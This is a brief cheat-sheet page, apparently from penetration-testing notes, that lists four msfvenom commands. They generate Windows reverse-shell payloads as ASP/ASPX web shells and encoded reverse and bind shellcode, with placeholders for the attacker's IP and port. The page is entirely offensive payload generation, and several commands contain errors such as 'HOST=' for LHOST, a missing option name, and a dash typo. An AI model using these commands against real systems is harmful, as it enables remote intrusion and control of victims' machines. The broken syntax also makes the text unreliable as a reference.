msfvenom
========

.. code-block:: shell

	msfvenom -p windows/shell_reverse_tcp  HOST=[your_ip_address] LPORT=[Port] -f asp > shell.asp

.. code-block:: shell

	msfvenom -p windows/meterpreter/reverse_tcp [your_ip_address] LPORT=[Port] -f aspx > shell.aspx

.. code-block:: shell

	msfvenom -p linux/x86/shell\_bind\_tcp LPORT=[port]-f c -b "\\x00\\x0a\\x0d\\x20" –e x86/shikata\_ga\_nai

.. code-block:: shell

	msfvenom -p windows/shell\_reverse\_tcp LHOST=<IP Address> LPORT=[port]-b "\\x00\\x0a\\x0d" -f c -a x86 --platform windows -e x86/shikata\_ga\_nai